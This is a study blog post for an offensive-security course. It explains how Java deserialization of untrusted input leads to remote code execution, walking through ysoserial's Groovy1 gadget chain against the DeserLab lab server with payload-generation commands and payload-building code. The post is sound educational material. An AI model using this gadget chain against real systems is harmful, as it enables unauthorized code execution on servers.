# Java Deserialization: From `readObject` to RCE
## Purpose
This post describes in-depth _how_ a Java application can take serialized user-controlled input, deserialize it via a method such as `readObject` and get to remote code execution (RCE), using a specific example payload from the `ysoserial` tool. This writeup is an attempt to understand this for Offensive Security's Advanced Web Attacks & Exploitation course and OSWE exam.

NOTE: This post is nothing new. I would like to credit DiabloHorn and Nick Bloor for their blog posts I used to learn this information. Much of this post is regurgitation of these blog posts to solidify my knowledge. See [Credits & Resources](#credits--resources).
## Background
This analysis will assume _basic_ knowledge of object-oriented programming (OOP) and serialization, but not necessarily deep understanding. It is targeted towards infrastructure penetration testers who are studying application security.

## tl;dr
Analyzing the [Groovy1 payload](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java) from `ysoserial`, a vulnerable Java application deserializes untrusted input, the following happens leading to RCE:
  * The serialized object is reconstructed and `readObject` is called on the data stream
  * `readObject` calls a function, `entrySet`, on a property of the object
  * This property is actually a proxy object that routes all function calls to a `Groovy` `closure` object
  * The `closure` object maps `entrySet` to arbitrary system commands to be executed
  * Code execution!

## Part the First: Groovy Payload Analysis
### Environment Setup
Tools used for this analysis:
  - Vulnerable application: [DeserLab](https://github.com/NickstaDB/DeserLab)
  - Java serialized object analysis tool: [SerializationDumper](https://github.com/NickstaDB/SerializationDumper)
  - Java deserialization payload generation tool: [`ysoserial`](https://github.com/frohoff/ysoserial)

Here's my command history from setting it up on my Kali Linux machine:
```bash
cd ~/Documents/ru_for_serial/
wget https://github.com/NickstaDB/DeserLab/releases/download/v1.0/DeserLab-v1.0.zip
unzip DeserLab-v1.0.zip && rm DeserLab-v1.0.zip 
wget https://github.com/NickstaDB/SerializationDumper/releases/download/1.11/SerializationDumper-v1.11.jar
wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
mv ysoserial-master-SNAPSHOT.jar ysoserial.jar 
```

### First, Magic Exploitation with `ysoserial`
Start the vulnerable server:
```bash
java -jar DeserLab.jar -server 127.0.0.1 9090
```

Generate a payload with `ysoserial`:
```bash
root@toothless:~/Documents/ru_for_serial# java -jar ysoserial.jar Groovy1 'ping 127.0.0.1 -c 10' > payload.bin
root@toothless:~/Documents/ru_for_serial# xxd payload.bin | head -n5
00000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
00000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
00000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
00000030: 696f 6e48 616e 646c 6572 55ca f50f 15cb  ionHandlerU.....
00000040: 7ea5 0200 024c 000c 6d65 6d62 6572 5661  ~....L..memberVa
```

[Exploit](https://www.github.com/deletehead/java_deserialiation) the vulnerability:
```bash
root@toothless:~/Documents/ru_for_serial# ./deserlab_exploit.py 127.0.0.1 9090 payload.bin 
```

Get RCE:
```bash
root@toothless:~/Documents/ru_for_serial/DeserLab-v1.0# tcpdump -i lo icmp                                                                              
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode                                                                              
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes                                                                                 
23:40:40.680429 IP localhost > localhost: ICMP echo request, id 53703, seq 1, length 64                                                                 
23:40:40.680440 IP localhost > localhost: ICMP echo reply, id 53703, seq 1, length 64                                                                   
<-- snip -->
```

### Why You're Reading This
OK, so _how_ does this wizardry occur?!


#### Foundational Information
What initially confused me about this was how a blob of data can run code if deserialization only restores properties of objects, and you don't pass any code with the serialized data. While this is true, Java _does_ something on the object when it attempts to identify the object and restore its state in-memory. Classes that are serializable must [implement](https://www.w3schools.com/java/ref_keyword_implements.asp) the [`Serializable`](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html) interface which has a method called `readObject`. If you are familiar with PHP, this is similar in concept (as I understand it) to "magic methods" -- the [`readObject`](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html) method in Java would be similar to the PHP [`__wakeup()` magic method](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup). If this interface is not implemented in a class, then objects created with this class **can't** be serialized/deserialized.

The `readObject` method is meant to take a data stream and populate the class fields, restoring the object's state. If a `Serializable` class defines a new `readObject` method, this adds deserialization logic on top of the default behavior that restores the object state. The [default `readObject` method](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html) can be overwritten on objects that implement the `Serializable` interface, potentially introducing abusable logic.

In short, **deserialization exploits abuse functionality in this `readObject` logic to run arbitrary code via property-oriented programming**. Property-oriented programming (POP) is when code execution is directed by using (or manipulating) object _properties_ rather than traditional code logic. A _pop gadget_ is a portion of the POP payload that does something, and these are "chained" together in _POP gadget chains_ to execute code. When using POP to exploit deserialization, we do NOT send code per se, we send crafty objects with properties that result in command execution. 

An important destinction is that the target server must already know about these classes. To exploit a deserialization vulnerability, you identify `readObject` methods from classes in the application class path that are abusable. Classes in the path include all classes defined in the app source as well as all loaded libraries. The [`ysoserial` tool](https://github.com/frohoff/ysoserial/) is a tool that has already identified POP gadget chains in common libraries such as Spring, Groovy, and CommonCollections. If the target application uses any of these libraries, you should be able to use the matching `ysoserial` payload. If third-party libraries are unknown, you can attempt to cycle through each of these payloads and see if one works (careful for crashing...).

Now, let's look at an example of a POP gadget chain to understand how this results in RCE...

#### Ripping Apart a POP Gadget
[Here is the source code](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java) for this payload. I highly recommend you _use the Source, Luke!_ when trying to wrap your brain around this.

The "outer layer" object is the [`sun.reflect.annotation.AnnotationInvokationHandler` object](http://www.docjar.com/html/api/sun/reflect/annotation/AnnotationInvocationHandler.java.html). Note that this class implements `InvocationHandler` and `Serializable`. Take a look at lines 46-49 where we see the default constructor for this object which accepts a `Class` object and a `Map` object, and then look at the `readObject` method starting on line 328. 
```java
46       AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
47           this.type = type;
48           this.memberValues = memberValues;
49       }
```
*Default constructor for the `AnnotationInvokationHandler` object which simply sets the fields to the `Class` and `Map` passed in*
```java
328       private void readObject(java.io.ObjectInputStream s)
329           throws java.io.IOException, ClassNotFoundException {
330           s.defaultReadObject();
331   
332   
333           // Check to make sure that types have not evolved incompatibly
334   
335           AnnotationType annotationType = null;
336           try {
337               annotationType = AnnotationType.getInstance(type);
338           } catch(IllegalArgumentException e) {
339               // Class is no longer an annotation type; all bets are off
340               return;
341           }
342   
343           Map<String, Class<?>> memberTypes = annotationType.memberTypes();
344   
345           for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
346               String name = memberValue.getKey();
347               Class<?> memberType = memberTypes.get(name);
348               if (memberType != null) {  // i.e. member still exists
349                   Object value = memberValue.getValue();
350                   if (!(memberType.isInstance(value) ||
351                         value instanceof ExceptionProxy)) {
352                       memberValue.setValue(
353                           new AnnotationTypeMismatchExceptionProxy(
354                               value.getClass() + "[" + value + "]").setMember(
355                                   annotationType.members().get(name)));
356                   }
357               }
358           }
359       }
```
*The `readObject` method declared on line 328 will override the default method inherited from `Serializable`*

On line 345, we see a for loop that runs `entrySet()` on each `memberValue`. Keep this in mind as we go on. For now let's look at the [manual build of this payload from DiabloHorn's blog post](https://gist.github.com/DiabloHorn/44d91d3cbefa425b783a6849f23b8aa7#file-manualpayloadgenerate-java-L57-L71):
```java
57    public static Object getGroovyExploitObject() throws ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException {
58        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure("ping 127.0.0.1", "execute"), "entrySet");
59        //here we proxy all calls to methods 
60        final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerate.class.getClassLoader(), new Class[] {Map.class}, closure);
61        //this is the first class that will be deserialized
62        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
63        //access the constructor of the AnnotationInvocationHandler class
64        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
65        //normally the constructor is not accessible, so we need to make it accessible
66        constructor.setAccessible(true);
67        
68        //this is were we set the initial chain for exploitation
69        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, map); 
70        return secondInvocationHandler;
71    }
```
*The "business portion" of DiabloHorn's manual build of the `Groovy1` payload*

Let's look at this payload from the inside out. First on line 58 we see the `Groovy` objects [`ConvertedClosure`](https://docs.groovy-lang.org/latest/html/api/org/codehaus/groovy/runtime/ConvertedClosure.html) and [`MethodClosure`](https://docs.groovy-lang.org/latest/html/api/org/codehaus/groovy/runtime/MethodClosure.html).<!-- FACT CHECK --> `MethodClosure` will create an object that represents a method invoked on an object; in this case, the method is [`execute`](http://docs.groovy-lang.org/latest/html/groovy-jdk/java/lang/String.html#execute%28%29) and the object is the `String` "ping 127.0.0.1". This is then adapted to `entrySet` using `ConvertedClosure` and stored in `closure`. Remember `entrySet`? Keep remembering.

Next on line 60, we create a proxy `Map` object, which is a [Java proxy object](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html) that is _acting_ as a `Map` object. Basically, a [proxy object routes function calls](https://www.baeldung.com/java-dynamic-proxies) to another object. So, when `entrySet` (Remember that? Good.) is called on the proxy object, it routes it to `closure`, which will run the `execute` method on the `String` of the `MethodClosure` closure when `entrySet` is called on `closure`.

Coming down to the home stretch, we have lines 62-65, where we obtain the constructor for the [`AnnotationInvocationHandler` class](http://www.docjar.com/html/api/sun/reflect/annotation/AnnotationInvocationHandler.java.html) we referenced above. Line 65 is required to work with the constructor. Looking with fresh eyes at the constructor on lines 46-49, we see that this object accepts a `Class` object and `Map` object as arguments. On line 69, we create a new `InvocationHandler` object that is an instance of `AnnotationInvocationHandler` with the arguments `Override.class` and `map` (which we created in line 60). The [`Override.class`](https://docs.oracle.com/javase/7/docs/api/java/lang/Override.html) passed in is just a class that extends `Annotation` and works well with the constructor without throwing errors (we don't really use it).

So, we create an object `secondInvocationHandler` that is an `AnnotationInvocationHandler` object that wraps around a proxy `map` object, which routes all function invocations to the `closure` object, which maps the `entrySet` function call to an invocation of `execute()` on the `String` "ping 127.0.0.1". When this object is serialized and then deserialized by a vulnerable application, the object is reconstructed and the `readObject` method of `AnnotationInvocationHandler` is called which then begins our chain by running `entrySet` on the `map` object, which proxies to our `closure` object and gets the final intended RCE.

## Credits & Resources
  - [diablohorn's fantastic blog post](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
  - NickstaDB tools & blog post:
    - [Attacking Java Deserialization](https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/)
    - [DeserLab](https://github.com/NickstaDB/DeserLab)
    - [SerializationDumper](https://github.com/NickstaDB/SerializationDumper)
  - Of course, [`ysoserial`](https://github.com/frohoff/ysoserial)
